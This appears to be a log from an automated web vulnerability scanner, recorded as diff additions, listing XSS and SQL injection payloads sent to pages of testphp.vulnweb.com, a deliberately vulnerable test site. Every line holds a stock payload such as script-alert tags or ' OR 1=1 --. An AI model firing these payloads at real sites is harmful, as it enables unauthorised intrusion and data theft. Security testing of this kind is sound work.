+[2025-06-11 23:19:07] XSS at http://testphp.vulnweb.com/product.php?pic=4 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:07] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: admin' --
+[2025-06-11 23:19:08] XSS at http://testphp.vulnweb.com/product.php?pic=4 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:08] XSS at http://testphp.vulnweb.com/product.php?pic=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:08] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: ' OR 1=1 --
+[2025-06-11 23:19:09] XSS at http://testphp.vulnweb.com/product.php?pic=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:09] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: " OR "1"="1
+[2025-06-11 23:19:09] XSS at http://testphp.vulnweb.com/product.php?pic=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:09] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: admin' --
+[2025-06-11 23:19:10] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: ' OR 1=1 --
+[2025-06-11 23:19:10] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: ' OR 1=1 --
+[2025-06-11 23:19:10] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: " OR "1"="1
+[2025-06-11 23:19:10] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: " OR "1"="1
+[2025-06-11 23:19:11] XSS at http://testphp.vulnweb.com/product.php?pic=5 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:11] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: admin' --
+[2025-06-11 23:19:11] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: admin' --
+[2025-06-11 23:19:11] XSS at http://testphp.vulnweb.com/product.php?pic=5 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:11] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: ' OR 1=1 --
+[2025-06-11 23:19:12] XSS at http://testphp.vulnweb.com/product.php?pic=5 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:12] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: " OR "1"="1
+[2025-06-11 23:19:12] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: ' OR 1=1 --
+[2025-06-11 23:19:12] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: admin' --
+[2025-06-11 23:19:13] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: " OR "1"="1
+[2025-06-11 23:19:13] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: admin' --
+[2025-06-11 23:19:14] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: ' OR 1=1 --
+[2025-06-11 23:19:14] XSS at http://testphp.vulnweb.com/product.php?pic=5 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:14] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: " OR "1"="1
+[2025-06-11 23:19:15] XSS at http://testphp.vulnweb.com/product.php?pic=5 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:15] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: admin' --
+[2025-06-11 23:19:15] XSS at http://testphp.vulnweb.com/product.php?pic=5 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:16] XSS at http://testphp.vulnweb.com/product.php?pic=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:16] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: ' OR 1=1 --
+[2025-06-11 23:19:16] XSS at http://testphp.vulnweb.com/product.php?pic=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:17] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: " OR "1"="1
+[2025-06-11 23:19:17] XSS at http://testphp.vulnweb.com/product.php?pic=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:17] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: admin' --
+[2025-06-11 23:19:17] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: ' OR 1=1 --
+[2025-06-11 23:19:18] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: ' OR 1=1 --
+[2025-06-11 23:19:18] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: " OR "1"="1
+[2025-06-11 23:19:18] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: " OR "1"="1
+[2025-06-11 23:19:18] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: admin' --
+[2025-06-11 23:19:18] XSS at http://testphp.vulnweb.com/product.php?pic=6 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:19] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: admin' --
+[2025-06-11 23:19:19] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: ' OR 1=1 --
+[2025-06-11 23:19:19] XSS at http://testphp.vulnweb.com/product.php?pic=6 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:19] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: " OR "1"="1
+[2025-06-11 23:19:19] XSS at http://testphp.vulnweb.com/product.php?pic=6 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:20] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: admin' --
+[2025-06-11 23:19:20] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: ' OR 1=1 --
+[2025-06-11 23:19:20] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: " OR "1"="1
+[2025-06-11 23:19:21] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: admin' --
+[2025-06-11 23:19:22] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: ' OR 1=1 --
+[2025-06-11 23:19:22] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: " OR "1"="1
+[2025-06-11 23:19:22] XSS at http://testphp.vulnweb.com/product.php?pic=6 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:23] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: admin' --
+[2025-06-11 23:19:23] XSS at http://testphp.vulnweb.com/product.php?pic=6 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:23] XSS at http://testphp.vulnweb.com/product.php?pic=4 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:23] XSS at http://testphp.vulnweb.com/product.php?pic=6 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:24] XSS at http://testphp.vulnweb.com/product.php?pic=4 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:24] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: ' OR 1=1 --
+[2025-06-11 23:19:24] XSS at http://testphp.vulnweb.com/product.php?pic=4 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:24] XSS at http://testphp.vulnweb.com/artists.php?artist=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:24] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: " OR "1"="1
+[2025-06-11 23:19:25] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: ' OR 1=1 --
+[2025-06-11 23:19:25] XSS at http://testphp.vulnweb.com/artists.php?artist=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:25] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: admin' --
+[2025-06-11 23:19:25] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: " OR "1"="1
+[2025-06-11 23:19:25] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: ' OR 1=1 --
+[2025-06-11 23:19:25] XSS at http://testphp.vulnweb.com/artists.php?artist=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:26] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: admin' --
+[2025-06-11 23:19:26] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: " OR "1"="1
+[2025-06-11 23:19:26] SQLi at http://testphp.vulnweb.com/artists.php?artist=2 using payload: ' OR 1=1 --
+[2025-06-11 23:19:26] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: ' OR 1=1 --
+[2025-06-11 23:19:26] SQLi at http://testphp.vulnweb.com/artists.php?artist=2 using payload: " OR "1"="1
+[2025-06-11 23:19:26] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: admin' --
+[2025-06-11 23:19:27] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: " OR "1"="1
+[2025-06-11 23:19:27] SQLi at http://testphp.vulnweb.com/artists.php?artist=2 using payload: admin' --
+[2025-06-11 23:19:27] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: admin' --
+[2025-06-11 23:19:28] XSS at http://testphp.vulnweb.com/artists.php?artist=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:28] XSS at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:28] XSS at http://testphp.vulnweb.com/artists.php?artist=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:28] XSS at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:29] XSS at http://testphp.vulnweb.com/artists.php?artist=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:29] XSS at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:30] SQLi at http://testphp.vulnweb.com/artists.php?artist=2 using payload: ' OR 1=1 --
+[2025-06-11 23:19:30] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: ' OR 1=1 --
+[2025-06-11 23:19:30] SQLi at http://testphp.vulnweb.com/artists.php?artist=2 using payload: " OR "1"="1
+[2025-06-11 23:19:30] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: " OR "1"="1
+[2025-06-11 23:19:31] SQLi at http://testphp.vulnweb.com/artists.php?artist=2 using payload: admin' --
+[2025-06-11 23:19:31] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: admin' --
+[2025-06-11 23:19:31] XSS at http://testphp.vulnweb.com/product.php?pic=5 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:31] XSS at http://testphp.vulnweb.com/product.php?pic=5 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:32] XSS at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:32] XSS at http://testphp.vulnweb.com/product.php?pic=5 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:32] XSS at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:32] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: ' OR 1=1 --
+[2025-06-11 23:19:33] XSS at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:33] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: " OR "1"="1
+[2025-06-11 23:19:33] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: ' OR 1=1 --
+[2025-06-11 23:19:33] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: admin' --
+[2025-06-11 23:19:33] XSS at http://testphp.vulnweb.com/product.php?pic=7 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:34] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: " OR "1"="1
+[2025-06-11 23:19:34] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: ' OR 1=1 --
+[2025-06-11 23:19:34] XSS at http://testphp.vulnweb.com/product.php?pic=7 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:34] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: admin' --
+[2025-06-11 23:19:34] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: " OR "1"="1
+[2025-06-11 23:19:34] XSS at http://testphp.vulnweb.com/product.php?pic=7 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:35] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: admin' --
+[2025-06-11 23:19:35] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: ' OR 1=1 --
+[2025-06-11 23:19:35] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: " OR "1"="1
+[2025-06-11 23:19:36] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: admin' --
+[2025-06-11 23:19:37] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: ' OR 1=1 --
+[2025-06-11 23:19:37] XSS at http://testphp.vulnweb.com/product.php?pic=7 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:37] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: " OR "1"="1
+[2025-06-11 23:19:37] XSS at http://testphp.vulnweb.com/product.php?pic=7 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:38] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: admin' --
+[2025-06-11 23:19:38] XSS at http://testphp.vulnweb.com/product.php?pic=7 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:38] XSS at http://testphp.vulnweb.com/product.php?pic=6 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:38] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: ' OR 1=1 --
+[2025-06-11 23:19:39] XSS at http://testphp.vulnweb.com/product.php?pic=6 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:39] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: " OR "1"="1
+[2025-06-11 23:19:39] XSS at http://testphp.vulnweb.com/product.php?pic=6 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:39] XSS at http://testphp.vulnweb.com/artists.php?artist=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:40] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: admin' --
+[2025-06-11 23:19:40] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: ' OR 1=1 --
+[2025-06-11 23:19:40] XSS at http://testphp.vulnweb.com/artists.php?artist=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:40] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: ' OR 1=1 --
+[2025-06-11 23:19:40] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: " OR "1"="1
+[2025-06-11 23:19:40] XSS at http://testphp.vulnweb.com/artists.php?artist=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:41] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: " OR "1"="1
+[2025-06-11 23:19:41] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: admin' --
+[2025-06-11 23:19:41] SQLi at http://testphp.vulnweb.com/artists.php?artist=3 using payload: ' OR 1=1 --
+[2025-06-11 23:19:41] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: admin' --
+[2025-06-11 23:19:41] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: ' OR 1=1 --
+[2025-06-11 23:19:41] SQLi at http://testphp.vulnweb.com/artists.php?artist=3 using payload: " OR "1"="1
+[2025-06-11 23:19:42] SQLi at http://testphp.vulnweb.com/artists.php?artist=3 using payload: admin' --
+[2025-06-11 23:19:42] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: " OR "1"="1
+[2025-06-11 23:19:43] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: admin' --
+[2025-06-11 23:19:43] XSS at http://testphp.vulnweb.com/artists.php?artist=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:43] XSS at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:44] XSS at http://testphp.vulnweb.com/artists.php?artist=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:44] XSS at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:44] XSS at http://testphp.vulnweb.com/artists.php?artist=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:44] XSS at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:44] XSS at http://testphp.vulnweb.com/artists.php?artist=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:45] SQLi at http://testphp.vulnweb.com/artists.php?artist=3 using payload: ' OR 1=1 --
+[2025-06-11 23:19:45] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: ' OR 1=1 --
+[2025-06-11 23:19:45] XSS at http://testphp.vulnweb.com/artists.php?artist=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:45] SQLi at http://testphp.vulnweb.com/artists.php?artist=3 using payload: " OR "1"="1
+[2025-06-11 23:19:45] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: " OR "1"="1
+[2025-06-11 23:19:45] XSS at http://testphp.vulnweb.com/artists.php?artist=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:46] SQLi at http://testphp.vulnweb.com/artists.php?artist=3 using payload: admin' --
+[2025-06-11 23:19:46] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: admin' --
+[2025-06-11 23:19:47] XSS at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:47] XSS at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:47] SQLi at http://testphp.vulnweb.com/artists.php?artist=2 using payload: ' OR 1=1 --
+[2025-06-11 23:19:47] XSS at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:47] XSS at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:48] SQLi at http://testphp.vulnweb.com/artists.php?artist=2 using payload: " OR "1"="1
+[2025-06-11 23:19:48] XSS at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:48] XSS at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:48] SQLi at http://testphp.vulnweb.com/artists.php?artist=2 using payload: admin' --
+[2025-06-11 23:19:48] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: ' OR 1=1 --
+[2025-06-11 23:19:48] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: ' OR 1=1 --
+[2025-06-11 23:19:49] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: " OR "1"="1
+[2025-06-11 23:19:49] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: " OR "1"="1
+[2025-06-11 23:19:49] XSS at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:49] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: admin' --
+[2025-06-11 23:19:49] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: admin' --
+[2025-06-11 23:19:50] XSS at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:50] XSS at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:50] XSS at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:51] XSS at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:51] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: ' OR 1=1 --
+[2025-06-11 23:19:51] XSS at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:51] XSS at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:51] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: " OR "1"="1
+[2025-06-11 23:19:52] XSS at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:52] XSS at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:52] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: admin' --
+[2025-06-11 23:19:52] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: ' OR 1=1 --
+[2025-06-11 23:19:52] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: ' OR 1=1 --
+[2025-06-11 23:19:53] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: " OR "1"="1
+[2025-06-11 23:19:53] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: " OR "1"="1
+[2025-06-11 23:19:53] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: admin' --
+[2025-06-11 23:19:53] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: admin' --
+[2025-06-11 23:19:54] XSS at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:54] XSS at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:54] XSS at http://testphp.vulnweb.com/product.php?pic=7 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:55] XSS at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:55] XSS at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:55] XSS at http://testphp.vulnweb.com/product.php?pic=7 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:55] XSS at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:55] XSS at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:55] XSS at http://testphp.vulnweb.com/product.php?pic=7 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:56] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: ' OR 1=1 --
+[2025-06-11 23:19:56] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: ' OR 1=1 --
+[2025-06-11 23:19:56] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: ' OR 1=1 --
+[2025-06-11 23:19:56] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: " OR "1"="1
+[2025-06-11 23:19:56] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: " OR "1"="1
+[2025-06-11 23:19:57] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: " OR "1"="1
+[2025-06-11 23:19:57] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: admin' --
+[2025-06-11 23:19:57] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: admin' --
+[2025-06-11 23:19:57] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: admin' --
+[2025-06-11 23:19:58] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: ' OR 1=1 --
+[2025-06-11 23:19:58] XSS at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:58] XSS at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:19:58] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: " OR "1"="1
+[2025-06-11 23:19:58] XSS at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:59] XSS at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:19:59] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: admin' --
+[2025-06-11 23:19:59] XSS at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:59] XSS at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:19:59] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: ' OR 1=1 --
+[2025-06-11 23:20:00] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: ' OR 1=1 --
+[2025-06-11 23:20:00] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: " OR "1"="1
+[2025-06-11 23:20:00] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: " OR "1"="1
+[2025-06-11 23:20:00] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: admin' --
+[2025-06-11 23:20:01] XSS at http://testphp.vulnweb.com/artists.php?artist=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:20:01] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: admin' --
+[2025-06-11 23:20:01] XSS at http://testphp.vulnweb.com/artists.php?artist=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:02] XSS at http://testphp.vulnweb.com/artists.php?artist=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:02] XSS at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: <script>alert(1)</script>
+[2025-06-11 23:20:02] SQLi at http://testphp.vulnweb.com/artists.php?artist=3 using payload: ' OR 1=1 --
+[2025-06-11 23:20:02] XSS at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:02] XSS at http://testphp.vulnweb.com using payload: <script>alert(1)</script>
+[2025-06-11 23:20:03] SQLi at http://testphp.vulnweb.com/artists.php?artist=3 using payload: " OR "1"="1
+[2025-06-11 23:20:03] XSS at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:03] XSS at http://testphp.vulnweb.com using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:03] SQLi at http://testphp.vulnweb.com/artists.php?artist=3 using payload: admin' --
+[2025-06-11 23:20:03] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: ' OR 1=1 --
+[2025-06-11 23:20:03] XSS at http://testphp.vulnweb.com using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:04] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: " OR "1"="1
+[2025-06-11 23:20:04] SQLi at http://testphp.vulnweb.com using payload: ' OR 1=1 --
+[2025-06-11 23:20:04] XSS at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:20:04] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: admin' --
+[2025-06-11 23:20:04] SQLi at http://testphp.vulnweb.com using payload: " OR "1"="1
+[2025-06-11 23:20:05] XSS at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:05] SQLi at http://testphp.vulnweb.com using payload: admin' --
+[2025-06-11 23:20:05] XSS at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:06] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: ' OR 1=1 --
+[2025-06-11 23:20:06] XSS at http://testphp.vulnweb.com/index.php using payload: <script>alert(1)</script>
+[2025-06-11 23:20:06] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: " OR "1"="1
+[2025-06-11 23:20:07] XSS at http://testphp.vulnweb.com/index.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:07] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: admin' --
+[2025-06-11 23:20:07] XSS at http://testphp.vulnweb.com/index.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:08] SQLi at http://testphp.vulnweb.com/index.php using payload: ' OR 1=1 --
+[2025-06-11 23:20:08] XSS at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:20:08] SQLi at http://testphp.vulnweb.com/index.php using payload: " OR "1"="1
+[2025-06-11 23:20:08] XSS at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:20:09] SQLi at http://testphp.vulnweb.com/index.php using payload: admin' --
+[2025-06-11 23:20:09] XSS at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:20:10] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: ' OR 1=1 --
+[2025-06-11 23:20:10] XSS at http://testphp.vulnweb.com/categories.php using payload: <script>alert(1)</script>
+[2025-06-11 23:20:10] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: " OR "1"="1
+[2025-06-11 23:20:10] XSS at http://testphp.vulnweb.com/categories.php using payload: "><svg/onload=alert(1)>
